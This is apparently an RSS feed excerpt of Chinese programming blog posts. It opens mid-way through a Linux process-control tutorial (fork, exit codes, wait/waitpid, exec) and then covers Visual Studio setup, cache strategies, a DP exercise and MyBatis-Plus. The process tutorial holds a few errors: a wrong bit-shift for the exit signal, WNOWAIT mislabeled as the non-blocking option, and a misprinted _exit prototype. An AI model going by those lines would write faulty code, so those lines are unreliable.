而父进程创建子进程是为了让子进程完成任务的，所以父进程需要标志每一个子进程，所以父进程通过返回子进程的PID来标识每一个子进程
而子进程只有唯一的父进程，所以不需要标识父进程，因此返回一个 0 就可以了
2.3 写时拷贝
通常，父子代码共享，父子不写入时，数据共享，当任意一方试图写入，便以写时拷贝的方式各自一份副本。 （进程的独立性）
详情如下：
一开始创建子进程的时候，子进程和父进程的代码和数据共享，即相同的虚拟地址会映射到相同的物理地址空间。
当任意一方试图写入，便以写时拷贝的方式各自一份副本。比如：当子进程要修改父进程中的数据的时候，父进程中的数据会重新的拷贝一份，然后子进程再对数据进行修改。这样父子进程中的数据就独立了（进程独立性）
🔥 对于写时拷贝，有三个问题要注意：
为什么要进行写时拷贝
❓
进程具有独立性。多进程运行，需要独享各种资源，多进程运行期间互不干扰，不能让子进程的修改影响到父进程
为什么不在创建子进程的时候就直接在子进程中拷贝一份父进程中的代码和数据
❓
子进程不一定会修改父进程中的code或者data，只有当需要修改的时候，拷贝父进程中的数据才会有意义
这种按需分配的方式，也是一种延时分配，可以高效的时候使用内存空间和运行的效率
父进程的代码段会不会进行拷贝
❓
一般情况下，子进程只会修改父进程副本的数据，不会对父进程的代码进行什么操作。但是当在进程替换的时候，子进程会拷贝一份父进程的代码段。
2.4 fork 调用失败原因
一般情况下
fork()
函数不会调用失败，但是有两个情况下会使得
fork()
创建子进程失败：
系统中已经存在了很多的进程，内存空间不足以再创建进程了
实际用户的进程超过了限制
2.5 fork 使用场景
一个进程希望有多个进程执行一段代码的不同部分
可以在一个进程中调用另一个进程，可以通过进程替换
exec
系列函数实现
3. 进程终止
了解进程创建之后，我们就要来了解一个进程的终止
进程终止做的事：
释放曾经的代码和数据所占据的空间
释放内核数据结构
3.1 进程终止的使用场景
进程需要终止退出的情况有三种：
代码运行完毕，并且运行结果正确。（进程正常终止）
代码运行完毕，并且运行结果不正确。（进程正常终止）
进程崩溃（进程异常终止）
代码跑完，结果不正确的原因可以通过退出码确定，一旦出现异常，退出码就没有意义了，进程出异常，本质是因为进程收到了OS发给进程的信号。
3.2 进程退出码
3.2.1 进程退出码的理解
得到进程退出码有不止一种方式，但是这里介绍一种大家最熟悉的得到进程退出码的方式。
如果想要写一个
C/C++程序
的代码，写的第一个函数一定是
main()
，而
main()
是由返回值的。
而所谓的进程退出码就是以
main()
函数的返回值的形式返回的。
退出码为0表示代码执行成功，退出码为非0表示代码执行失败。
所以一般情况下，main()函数返回0，以表示代码执行成功。
下面两个问题可以帮助你更好地理解进程退出码的意义？
main()
的返回值给了谁❓
main()
函数也是一个函数，既然函数有返回值，那么该函数返回给了谁呢？要想搞清楚这个问题，就需要搞清楚到底是谁调用了
main()
函数
不同的平台下调用
main()
函数的函数不同，
但是最终
main()
函数是由系统间接调用的，所以其实
main()
的返回值返回给了操作系统
为什么
main()
函数要有返回值或者进程要有退出码❓
一个程序被加载到内存上，形成进程，是用来完成某项任务的。当进程完成任务后，
我们需要知道进程完成任务的情况，因此需要通过退出码这种形式来得知进程执行任务的情况。
为什么退出码为 0 表示执行成功，非 0 表示执行错误❓
由于进程需要通过进程退出码的性质告诉外界自己完成任务的情况
如果进程成功的执行完任务正常退出，这种情况很好，并且这种情况值唯一的，所以用0就可以表示了
但是如果进程非正常退出，那么我们就需要知道
进程为什么不正常退出
，这时情况就比较复杂了，
不正常退出的情况有很多， 例如内存空间不足、非法访问以及栈溢出等等
。所以非正常退出的原因需要很多的数字来表示，因此就使用了非0来表示。
3.2.2 查看进程退出码
进程退出码有很多，每一个退出码都有对应的字符串含义，帮助用户确认执行失败的原因。
我们可以使用
$?
来查看最近一个进程的退出码，如下：
echo $? # 打印出最近一个进程的退出码
如果想要知道每一种的进程退出码的含义， C语言当中的strerror函数可以通过错误码，获取该错误码在C语言当中对应的错误信息：
#include &lt;cstdio&gt;
#include &lt;cstring&gt;int main()
{for (int i = 0; i &lt; 10; i ++) {printf("第 %d 中进程退出码的含义: %s\n", i, strerror(i));}return 0;
}
运行结果如下：
注意：这些退出码具体代表什么含义是人为规定的，不同环境下相同的退出码的字符串含义可能不同
3.3 进程终止的方法
正常终止（可以通过 echo $? 查看进程退出码）：
从main返回，比如：return 0
调用exit
_exit
3.3.1 return 退出
return是一种常见的退出进程方法。
执行return n等同于执行exit(n)，因为调用main的运行时函数会将 main 的返回值当做 exit的参数
int main()
{printf("return 100\n");return 100;
}
运行结果如下：
3.3.2 _exit 退出
#include &lt;unistd.h&gt;
void exit(int status);
说明：虽然status是int，但是仅有低8位可以被父进程所用。所以_exit(-1)时，在终端执行$?发现返回值
是255。
3.3.3 exit 退出
#include &lt;unistd.h&gt;
void exit(int status);
exit 最后也会调用 _exit, 但在调用 _exit 之前，还做了其他工作：
执行用户通过 atexit或on_exit定义的清理函数。
关闭所有打开的流，所有的缓存数据均被写入
调用_exit
int main()
{printf("hello");exit(0);
}运行结果(冲刷缓冲区):
[root@localhost linux]# ./a.out
hello[root@localhost linux]#int main()
{printf("hello");_exit(0);
}运行结果（直接退出）:
[root@localhost linux]# ./a.out
[root@localhost linux]#
3.3.4 三者区别
相似点：
通过return，exit()和_exit()都可以得到退出码。
不同点：
return：return只能在main()函数中返回才可以退出进程。
exit()：
exit
函数会执行用户定义的清理函数、冲刷
缓冲
，关闭流等操作，然后再终止进程，
_exit()：_exit()可以在任何的地方随时的退出进程，会直接终止进程，不会做任何收尾工作。
联系：
在main()函数中的return等价于exit()
在exit()中封装了_exit()函数。
注意 return 和 exit
区别
exit()
函数和
return
的功能差不多，但是
exit()
在任何的地方只要被调用，就会立即的退出进程
只有在
main()
函数中
return
才会退出进程，而
exit()
在任意一个函数中都可以退出进程
4. 进程等待
4.1 进程等待的必要性
「进程等待」
的工作就是让父进程回收子进程的资源，获取子进程的退出信息。
因为如果子进程退出，父进程不读取子进程的退出信息回收子进程的资源的话，子进程就会变成僵尸进程，进而造成内存泄漏。
而一个进程变成僵尸进程的时候，就算是使用
kill -9
发送信号的方式也是不能回收该进程的资源的。
所以一定需要通过父进程通过进程等待的方式，来回收子进程的资源，同时为了搞清楚子进程完成任务的情况，也需要通过通过进程等待的方式获取子进程的退出信息。
4.2 子进程 status
在学习相关内容之前，我们先来理解一下子进程的 status 是啥意思，因为后面我们需要通过下面两个函数来做进程等待
pid_t wait(int* status)
pid_t waitpid(pid_t pid, int* status, int options);
我们发现这两个函数中都有一个参数status，而这个参数比较复杂且重要
4.2.1 status 的作用
🌈 上文说过，进程等待不仅是回收子进程的资源也需要获取子进程的退出信息，所以
status
的作用就是获取退出的信息 。
status
是一个输出型参数，即在wait()函数外面的变量，传入
wait()
函数，然后在
wait()
内部对
wait()
进行操作，从而改变
status
注意：
如果不想要获取进程的退出信息的话，就可以用
NULL
替代
status
4.2.2 status 的构造
⭐
status
不能简单的当作整形来看待，可以当作位图来看待。 在
status
的后16个比特位上，高8位表示进程退出的状态，即进程退出码。而后7位为进程终止的信号。第8个比特位是一个标志
注意：
当进程正常退出的时候，不用查看退出信号。而如果一个进程异常退出，即被信号杀死的话，不用看退出码
4.2.3 从 status 中获取退出信息
有两种方法我们可以获取
status
中的退出信息
方法一：位运算
如果已经知道了
status
中的比特位组成部分，我们就能通过位运算直接获取退出信息
int exit_code = (status &gt;&gt; 8) &amp; 0xff; // 获取退出码
int exit_signal = status &gt;&gt; 0x7f; // 获取退出信号
方法二：使用宏
在系统中，提供了两个宏来获取提出码和退出信号
WIFEXITED(status); // 用于查看进程是否正常退出，其实就是查看是否有退出信号
WEXITSTATUS(status); // 用于获取进程的退出码
注意：当一个信号被杀死，进程等待是没有意义的
测试代码如下：
int main()
{pid_t pid;if ((pid = fork()) == -1)perror("fork"), exit(1);if (pid == 0) {sleep(20);exit(10);}else {int st;int ret = wait(&amp;st);if (ret &gt; 0 &amp;&amp; (st &amp; 0X7F) == 0) { // 正常退出printf("child exit code:%d\n", (st &gt;&gt; 8) &amp; 0XFF);}else if (ret &gt; 0) { // 异常退出printf("sig code : %d\n", st &amp; 0X7F);}}
}
测试结果：
[root@localhost linux]# . / a.out #等20秒退出
child exit code : 10
[root@localhost linux]# . / a.out #在其他终端kill掉
sig code : 9
4.3 进程等待的方法
4.3.1 wait()
#include&lt;sys/types.h&gt;
#include&lt;sys/wait.h&gt;
pid_t wait(int*status);
返回值：成功返回被等待进程pid，失败返回-1。
参数：status为输出型参数，通过传入一个参数来获取被等待的子进程的退出状态。不关心则可以设置成为NULL
4.3.2
waitpid()
pid_ t waitpid(pid_t pid, int *status, int options);
返回值：当正常返回的时候 waitpid 返回收集到的子进程的进程ID；如果设置了选项 WNOHANG ,而调用中 waitpid 发现没有已退出的子进程可收集,则返回0；如果调用中出错,则返回 -1,这时 errno 会被设置成相应的值以指示错误所在；
参数：pid：Pid = -1, 等待任一个子进程。与wait等效。Pid &gt; 0. 等待其进程ID与pid相等的子进程。status:WIFEXITED(status): 若为正常终止子进程返回的状态，则为真。（查看进程是否是正常退出）WEXITSTATUS(status): 若WIFEXITED非零，提取子进程退出码。（查看进程的退出码）options:WNOHANG: 若pid指定的子进程没有结束，则 waitpid()函数返回0，不予以等待。若正常结束，则返回该子进程的ID。
🌈
waitpid（）
函数的作用是：等待指定的一个子进程或者任意一个进程。（这个可以有options参数控制）
status：
输出型参数，获取子进程的退出信息，如果不需要进程退出的退出信息，可设置为NULL。
options：
当 options 设置为0的时候，叫做阻塞等待。当 options 设置为 WNOWAIT 的时候，叫做非阻塞等待。（后面会有阻塞等待和非阻塞等待的例子）
下面分别对阻塞等待和非阻塞等待举出一个例子：
在子进程运行的时候，父进程在干什么呢？如果父进程就在那里等待子进程完成任务，接收子进程的退出信息的话，这种方式就是阻塞等待。就好像父进程被阻塞住不能前进一样。
如果父进程在子进程运行的时候，自己可以感自己的事情，这种方式就叫做非阻塞等待。
所以想要判断是否为阻塞或者非阻塞等待，就只要判断父进程在子进程运行的时候，可不可以自己运行自己的代码即可。
4.3.3 进程的阻塞等待方式
int main()
{pid_t pid;pid = fork();if (pid &lt; 0) {printf("%s fork error\n", __FUNCTION__);return 1;}else if (pid == 0) { //childprintf("child is run, pid is : %d\n", getpid());sleep(5);exit(257);}else {int status = 0;pid_t ret = waitpid(-1, &amp;status, 0);//阻塞式等待，等待5Sprintf("this is test for wait\n");if (WIFEXITED(status) &amp;&amp; ret == pid) {printf("wait child 5s success, child return code is :%d.\n", WEXITSTATUS(status));}else {printf("wait child failed, return.\n");return 1;}}return 0;
}
运行结果:
[root@localhost linux] # . / a.out
child is run, pid is : 45110
this is test for wait
wait child 5s success, child return code is : 1.
4.3.4 进程的非阻塞等待方式
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/wait.h&gt;
int main()
{pid_t pid;pid = fork();if (pid &lt; 0) {printf("%s fork error\n", __FUNCTION__);return 1;}else if (pid == 0) { //childprintf("child is run, pid is : %d\n", getpid());sleep(5);exit(1);}else {int status = 0;pid_t ret = 0;do{ret = waitpid(-1, &amp;status, WNOHANG);//非阻塞式等待if (ret == 0) {printf("child is running\n");}sleep(1);} while (ret == 0);if (WIFEXITED(status) &amp;&amp; ret == pid) {printf("wait child 5s success, child return code is :%d.\n", WEXITSTATUS(status));}else {printf("wait child failed, return.\n");return 1;}}return 0;
}
5. 进程程序替换
5.1 替换原理
用
fork
创建子进程后执行的是和父进程相同的程序(但有可能执行不同的代码分支)，子进程往往要调用一种
exec
函数以执行另一个程序。
当进程调用一种
exec
函数时
该进程的
用户空间代码和数据完全被新程序替换
，
从新程序的启动例程开始执行
调用
exec
并不创建新进程,所以调用
exec
前后该进程的id并未改变
但是要注意两个问题❓
当进程被另一个进程替换时，并没有创建一个新的进程 而只是在原来的进程的基础上，在进程的物理内存中代码和数据被另一个进程的代码和数据段所替换而已。其余的数据结构类似
PCB，mm_struct，页表
等等结构并没有改变。
在
子进程进行程序替换之后，父进程中的代码段和数据段并没有受到任何的影响
。
因为当子进程在进行进程替换时，需要对进程的数据和代码段进程修改，这时进程会发生写时拷贝，而在写时拷贝之后，父子进程的代码和数据独立了，所以相互之间的数据和代码不会受到影响。
5.2 替换函数
进程替换函数是
exec
系列函数，而这一系列的函数一共有6个函数。
#include &lt;unistd.h&gt;
int execl(const char* path, const char* arg, ...);
int execlp(const char* file, const char* arg, ...);
int execle(const char* path, const char* arg, ..., char * const envp[]);
int execv(const char* path, char* const argv[]);
int execvp(const char* file, char* const argv[]);
int execve(const char* path, char* const argv[], char* const envp[]);
#include &lt;unistd.h&gt;int main()
{char *const argv[] = {"ps", "-ef", NULL};char *const envp[] = {"PATH=/bin:/usr/bin", "TERM=console", NULL};execl("/bin/ps", "ps", "-ef", NULL);// 带p的，可以使用环境变量PATH，无需写全路径execlp("ps", "ps", "-ef", NULL);// 带e的，需要自己组装环境变量execle("ps", "ps", "-ef", NULL, envp);execv("/bin/ps", argv);// 带p的，可以使用环境变量PATH，无需写全路径execvp("ps", argv);// 带e、p的，需要自己组装环境变量，无需写全路径execvpe("ps", argv, envp);// 带e的，需要自己组装环境变量execve("/bin/ps", argv, envp);exit(0);
}
我们来对上面的
execl
来进行分析，其他的大家可以自行去实践
int execl(const char* path, const char* arg, ...)
函数参数
path：要替换的可执行程序所在的路径
arg：给可执行程序传递的命令行参数（是一个可变参数列表），最后要以NULL结尾。
函数返回值
如果
execl
执行成功，则进程替换成功，那么就没有返回值，因为进程已经执行其他进程了
如果
execl
执行失败，则返回 -1
情况一：
只调用系统中的可执行程序
#include &lt;cstdio&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;int main()
{pid_t pid = fork();if (pid == 0) {// “/usr/bin/ls"是可执行文件的路径// "ls", "-a", "-l", "-i"是执行的方式// 就好像是直接在命令行中敲 ls -a -l -i样execl("/usr/bin/ls", "ls", "-a", "-l", "-i", NULL);exit(1);} else { // 进程等待，父进程回收子进程资源int status = 0;pid_t res = waitpid(pid, &amp;status, 0);if (res &gt; 0) {printf("wait child process success!\n");if (WIFEXITED(status)) {printf("exit code: %d\n", WEXITSTATUS(status));} else {printf("exit signal: %d\n", status &amp; 0x7f);}}}return 0;
}
运行结果如下：
情况二：
不只调用系统中的可执行程序，还利用一个自己写的程序去直接调用自己写的另一个程序
// hello.cpp
#include &lt;iostream&gt;int main()
{std::cout &lt;&lt; "hello world" &lt;&lt; std::endl;return 0;
}// test.c
#include &lt;cstdio&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;int main()
{pid_t pid = fork();if (pid == 0) {// “./hello"是可执行文件的路径// "hello"是执行的方式execl("./hello", "hello", NULL);exit(1);} else { // 进程等待，父进程回收子进程资源int status = 0;pid_t res = waitpid(pid, &amp;status, 0);if (res &gt; 0) {printf("wait child process success!\n");if (WIFEXITED(status)) {printf("exit code: %d\n", WEXITSTATUS(status));} else {printf("exit signal: %d\n", status &amp; 0x7f);}}}return 0;
}
运行结果如下：
5.3 替换函数解释
通过上面六个函数的学习，大家一定可以发现其中其实存在一些规律，他们的后缀函数如下：
l(list)：
表示参数采用
列表
的形式列出，
通过函数参数逐个给与，最终以NULL结尾
v(vector)：
表示参数采用
数组
的形式列出，
通过字符指针数组一次性给与。
p(path)：
表示执行程序可以自动在
环境变量PATH
中自动搜索可执行程序的路径，
没有 p 的需要指定路径
有p的会默认到 path 环境变量指定路径下寻找。
e(env)：
表示自己可以传入自己写的环境变量
没有 e 则默认使用父进程环境变量
有 e 则自定义环境变量。
函数名
参数格式
是否要写成绝对路径
是否使用当前的环境变量
execl
列表
✔️
✔️
execlp
列表
×（文件名即可）
✔️
execle
列表
✔️
×（自己设置环境变量）
execv
数组
✔️
✔️
execvp
数组
×（文件名即可）
✔️
execve
数组
✔️
×（自己设置环境变量）
事实上：其实
execve
才是真正的系统调用，其他的几个函数只不过对于
execve
进行了封装。以满足不同的调用需求。
小结
📖
【*★,°*:.☆(￣▽￣)/$:*.°★* 】那么本篇到此就结束啦，如果我的这篇博客可以给你提供有益的参考和启示，可以三连支持一下 💖！💞</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540176.html</guid><pubDate>Fri, 31 Oct 2025 07:27:10 +0000</pubDate></item><item><title>Visual Studio--VS安装配置使用教程</title><link>https://www.ppmy.cn/news/1540177.html</link><description>Visual Studio
Visual Studio 是一款功能强大的开发人员工具，可用于在一个位置完成整个开发周期。 它是一种全面的集成开发环境 (IDE)。对新手特别友好，使用方便，不需要复杂的去配置环境。用它学习很方便。
Studio安装教程
Visual Studio官网地址
下载免费的社区版本即可
下载好执行文件,双击打开后，会加载一些东西。最后出现下面的界面
安装visual studio
更改安装路径
首先，我们要设置一下安装路径。因为visual studio占用的空间十分大，我们可以把VS安装在非C盘，在这里，切换到安装位置，将下述三项的路径改成D盘或其他非系统盘。
但你只有一个盘或者有很大空间可以默认装在C盘不需要设置路径,运行速度较快。
自定义安装组件
这时我们就可以自定义选择组件进行下载
因为我是需要使用C/C++，所以选择了使用C/C++的桌面开发和visual studio扩展开发
下面会显示下载所占的空间，供参考（我这里因为已经下载过了）
选择好，在右下角选择安装，就会出现下载界面，等下载完毕后如图所示，点击启动就可以使用了。
开始使用
进入visual studio开发界面，点击创建新项目。
这里选择新建一个c++的空项目，C++兼容C所以C/C++都用空项目
设置
创建完成进入界面
先进行一些小设置
点击工具选项进行些设置
找到这个字体,高亮明显,方便敲代码。
写第一个程序
显示所有模板
打印一个hello world！
运行和使用
剩下的大家要慢慢摸索了，加油年轻人！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540177.html</guid><pubDate>Fri, 31 Oct 2025 07:27:14 +0000</pubDate></item><item><title>3种常用的缓存读写策略详解</title><link>https://www.ppmy.cn/news/1540178.html</link><description>在详解3种常用的缓存读写之前，我们先要了解什么事缓存读写。
缓存读写是指在使用缓存技术时，对数据进行读取和更新的操作过程。缓存是一种用于提高系统性能和可扩展性的技术，通过减少对慢速存储（如数据库）的访问次数，降低网络延迟，从而提升用户体验。
一、缓存读操作
缓存读操作是指从缓存中读取数据的过程。当应用程序需要读取数据时，会首先尝试从缓存中获取。如果缓存中存在所需的数据（称为缓存命中），则直接返回该数据给应用程序，无需再去访问慢速存储。如果缓存中不存在所需的数据（称为缓存未命中），则需要从慢速存储（如数据库）中读取数据，然后将数据放入缓存中，并返回给应用程序。
二、缓存写操作
缓存写操作是指将数据写入缓存的过程。写操作相对复杂一些，因为需要考虑数据的一致性和可靠性。常见的缓存写策略包括：
旁路缓存（Cache Aside Pattern）
：在这种模式下，应用程序直接操作数据库和缓存。当需要更新数据时，应用程序会首先更新数据库，然后删除或更新缓存中的对应数据。这种模式适用于数据一致性要求较高的场景。
直读直写模式（Read/Write Through）
：在这种模式下，缓存替应用程序与数据库进行交互。对于读请求，如果缓存命中，则直接返回数据；如果缓存未命中，则缓存会从数据库中读取数据，并存放到缓存中后返回。对于写请求，如果缓存命中，则缓存会更新数据，并同步更新数据库；如果缓存未命中，则应用程序会直接更新数据库。这种模式简化了应用程序的代码，但增加了缓存和数据库之间的交互复杂性。
写回模式（Write-Back）
：在这种模式下，写操作不会立即更新数据库，而是先将数据写入缓存，并标记为脏数据。当缓存需要被替换或定时更新时，再将脏数据写回数据库。这种模式可以提高写操作的性能，但增加了数据丢失的风险，因为脏数据在写回数据库之前可能会因为系统故障而丢失。
下面介绍到的三种模式各有优劣，不存在最佳模式，根据具体的业务场景选择适合自己的缓存读写模式
Cache Aside Pattern（旁路缓存模式）
Cache Aside Pattern 是我们平时使用比较多的一个缓存读写模式，比较适合读请求比较多的场景。
Cache Aside Pattern 中服务端需要同时维系 db 和 cache，并且是以 db 的结果为准。
下面我们来看一下这个策略模式下的缓存读写步骤。
写
：
先更新 db
然后直接删除 cache 。
简单画了一张图帮助大家理解写的步骤。
读
:
从 cache 中读取数据，读取到就直接返回
cache 中读取不到的话，就从 db 中读取数据返回
再把数据放到 cache 中。
简单画了一张图帮助大家理解读的步骤。
你仅仅了解了上面这些内容的话是远远不够的，我们还要搞懂其中的原理。
比如说别人很可能会问你：“
在写数据的过程中，可以先删除 cache ，后更新 db 么？
”
答案：
那肯定是不行的！因为这样可能会造成
数据库（db）和缓存（Cache）数据不一致
的问题。
举例：请求 1 先写数据 A，请求 2 随后读数据 A 的话，就很有可能产生数据不一致性的问题。
这个过程可以简单描述为：
请求 1 先把 cache 中的 A 数据删除 -&gt; 请求 2 从 db 中读取数据-&gt;请求 1 再把 db 中的 A 数据更新
当你这样回答之后，可能会紧接着就追问：“
在写数据的过程中，先更新 db，后删除 cache 就没有问题了么？
”
答案：
理论上来说还是可能会出现数据不一致性的问题，不过概率非常小，因为缓存的写入速度是比数据库的写入速度快很多。
举例：请求 1 先读数据 A，请求 2 随后写数据 A，并且数据 A 在请求 1 请求之前不在缓存中的话，也有可能产生数据不一致性的问题。
这个过程可以简单描述为：
请求 1 从 db 读数据 A-&gt; 请求 2 更新 db 中的数据 A（此时缓存中无数据 A ，故不用执行删除缓存操作 ） -&gt; 请求 1 将数据 A 写入 cache
现在我们再来分析一下
Cache Aside Pattern 的缺陷
。
缺陷 1：首次请求数据一定不在 cache 的问题
解决办法：可以将热点数据可以提前放入 cache 中。
缺陷 2：写操作比较频繁的话导致 cache 中的数据会被频繁被删除，这样会影响缓存命中率 。
解决办法：
数据库和缓存数据强一致场景：更新 db 的时候同样更新 cache，不过我们需要加一个锁/分布式锁来保证更新 cache 的时候不存在线程安全问题。
可以短暂地允许数据库和缓存数据不一致的场景：更新 db 的时候同样更新 cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小。
Read/Write Through Pattern（读写穿透）
Read/Write Through Pattern 中服务端把 cache 视为主要数据存储，从中读取数据并将数据写入其中。cache 服务负责将此数据读取和写入 db，从而减轻了应用程序的职责。
这种缓存读写策略小伙伴们应该也发现了在平时在开发过程中非常少见。抛去性能方面的影响，大概率是因为我们经常使用的分布式缓存 Redis 并没有提供 cache 将数据写入 db 的功能。
写（Write Through）：
先查 cache，cache 中不存在，直接更新 db。
cache 中存在，则先更新 cache，然后 cache 服务自己更新 db（
同步更新 cache 和 db
）。
简单画了一张图帮助大家理解写的步骤。
读(Read Through)：
从 cache 中读取数据，读取到就直接返回 。
读取不到的话，先从 db 加载，写入到 cache 后返回响应。
简单画了一张图帮助大家理解读的步骤。
Read-Through Pattern 实际只是在 Cache-Aside Pattern 之上进行了封装。在 Cache-Aside Pattern 下，发生读请求的时候，如果 cache 中不存在对应的数据，是由客户端自己负责把数据写入 cache，而 Read Through Pattern 则是 cache 服务自己来写入缓存的，这对客户端是透明的。
和 Cache Aside Pattern 一样， Read-Through Pattern 也有首次请求数据一定不再 cache 的问题，对于热点数据可以提前放入缓存中。
Write Behind Pattern（异步缓存写入）
Write Behind Pattern 和 Read/Write Through Pattern 很相似，两者都是由 cache 服务来负责 cache 和 db 的读写。
但是，两个又有很大的不同：
Read/Write Through 是同步更新 cache 和 db，而 Write Behind 则是只更新缓存，不直接更新 db，而是改为异步批量的方式来更新 db。
很明显，这种方式对数据一致性带来了更大的挑战，比如 cache 数据可能还没异步更新 db 的话，cache 服务可能就就挂掉了。
这种策略在我们平时开发过程中也非常非常少见，但是不代表它的应用场景少，比如消息队列中消息的异步写入磁盘、MySQL 的 Innodb Buffer Pool 机制都用到了这种策略。
Write Behind Pattern 下 db 的写性能非常高，非常适合一些数据经常变化又对数据一致性要求没那么高的场景，比如浏览量、点赞量。
总结
综上所述，缓存读写是缓存技术中的重要组成部分，通过合理的读写策略选择，可以提高系统的性能和可靠性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540178.html</guid><pubDate>Fri, 31 Oct 2025 07:27:16 +0000</pubDate></item><item><title>动态规划一＞下降路径最小和</title><link>https://www.ppmy.cn/news/1540179.html</link><description>1.题目：
2.解析：
代码：
/**1.创建dp表2.初始化3.填表4.返回值*/public int minFallingPathSum(int[][] matrix) {int n = matrix.length;int[][] dp = new int[n+1][n+2];int minNum = Integer.MAX_VALUE; for(int i = 1; i &lt;= n; i++) dp[i][0] = dp[i][n+1] = Integer.MAX_VALUE;for(int i = 1; i &lt;= n; i++)for(int j = 1; j &lt;= n; j++)dp[i][j] = Math.min(dp[i-1][j-1],Math.min(dp[i-1][j],dp[i-1][j+1])) + matrix[i-1][j-1];for(int i = 1; i &lt;= n; i++) minNum = Math.min(minNum,dp[n][i]);return minNum;}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540179.html</guid><pubDate>Fri, 31 Oct 2025 07:27:19 +0000</pubDate></item><item><title>SSM框架学习（七、MyBatis-Plus高级用法：最优化持久层开发）</title><link>https://www.ppmy.cn/news/1540180.html</link><description>目录
一、MyBatis-Plus快速入门
1.简介
2.快速入门
二、MyBatis-Plus核心功能
1.基于Mapper接口CRUD
（1）Insert 方法
（2）Delete方法
（3）Update 方法
（4）Select方法
2.基于Service接口CRUD
（1）save 方法
（2）saveOrUpdate方法
（3）remove 方法
（4）update 方法
（5）get 和 list 方法
3.分页查询实现
4.条件构造器使用
（1）条件构造器继承
（2）条件构造器继承结构
（3）基于QueryWrapper 组装条件
Ⅰ.组装查询条件
Ⅱ. 组装排序条件
Ⅲ. 组装删除条件
Ⅳ. and 和 or 关键字使用(修改)：
Ⅴ. 指定列映射查询
Ⅵ. condition判断组织条件
（4）基于 UpdateWrapper 组装条件
（5）基于LambdaQueryWrapper 组装条件
（6）基于 LambdaUpdateWrapper 组装条件
5.核心注解使用
（1）理解和介绍
（2）@TableName 注解
（3）@TableId 注解
（4）@TableField 注解
三、MyBatis-Plus 高级扩展
1.逻辑删除实现
2.乐观锁实现
（1）悲观锁和乐观锁场景和介绍
（2）使用mybatis-plus数据使用乐观锁（基于版本号技术）
3.防全表更新和删除实现
四、MyBatis-Plus代码生成器（MyBatisX插件）
1.Mybatisx 插件逆向工程
2.MyBatisX 快速代码生成
一、MyBatis-Plus快速入门
1.简介
MyBatis-Plus  (opens new window)（简称 MP）是一个 MyBatis  (opens new window) 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。
特性：
① 无侵入：
只做增强不做改变，引入它不会对现有工程产生影响，如丝般顺滑
② 损耗小：
启动即会自动注入基本 CURD，性能基本无损耗，直接面向对象操作
③ 强大的 CRUD 操作：
内置通用 Mapper、通用 Service，仅仅通过少量配置即可实现单表大部分 CRUD 操作，更有强大的条件构造器，满足各类使用需求
④ 支持 Lambda 形式调用：
通过 Lambda 表达式，方便的编写各类查询条件，无需再担心字段写错
⑤ 支持主键自动生成：
支持多达 4 种主键策略（内含分布式唯一 ID 生成器 - Sequence），可自由配置，完美解决主键问题
⑥ 支持 ActiveRecord 模式：
支持 ActiveRecord 形式调用，实体类只需继承 Model 类即可进行强大的 CRUD 操作
⑦ 支持自定义全局通用操作
：支持全局通用方法注入（ Write once, use anywhere ）
⑧ 内置代码生成器：
采用代码或者 Maven 插件可快速生成 Mapper 、 Model 、 Service 、 Controller 层代码，支持模板引擎，更有超多自定义配置等您来使用
⑨ 内置分页插件：
基于 MyBatis 物理分页，开发者无需关心具体操作，配置好插件之后，写分页等同于普通 List 查询
⑩ 分页插件支持多种数据库：
支持 MySQL、MariaDB、Oracle、DB2、H2、HSQL、SQLite、Postgre、SQLServer 等多种数据库
⑪ 内置性能分析插件：
可输出 SQL 语句以及其执行时间，建议开发测试时启用该功能，能快速揪出慢查询
⑫ 内置全局拦截插件：
提供全表 delete 、 update 操作智能分析阻断，也可自定义拦截规则，预防误操作
⑬
支持数据库：
MySQL，Oracle，DB2，H2，HSQL，SQLite，PostgreSQL，SQLServer，Phoenix，Gauss ，ClickHouse，Sybase，OceanBase，Firebird，Cubrid，Goldilocks，csiidb，informix，TDengine，redshift
达梦数据库，虚谷数据库，人大金仓数据库，南大通用(华库)数据库，南大通用数据库，神通数据库，瀚高数据库，优炫数据库
mybatis-plus总结：
自动生成单表的CRUD功能
提供丰富的条件拼接方式
全自动ORM类型持久层框架
2.快速入门
① 准备数据库脚本
CREATE TABLE user
(id BIGINT(20) NOT NULL COMMENT '主键ID',name VARCHAR(30) NULL DEFAULT NULL COMMENT '姓名',age INT(11) NULL DEFAULT NULL COMMENT '年龄',email VARCHAR(50) NULL DEFAULT NULL COMMENT '邮箱',PRIMARY KEY (id)
);INSERT INTO user (id, name, age, email) VALUES
(1, 'Jone', 18, 'test1@baomidou.com'),
(2, 'Jack', 20, 'test2@baomidou.com'),
(3, 'Tom', 28, 'test3@baomidou.com'),
(4, 'Sandy', 21, 'test4@baomidou.com'),
(5, 'Billie', 24, 'test5@baomidou.com');
② 准备boot工程，导入依赖
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;3.0.5&lt;/version&gt;&lt;/parent&gt;&lt;groupId&gt;com.mihoyo&lt;/groupId&gt;&lt;artifactId&gt;mybatis-plus-quick-01&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 测试环境 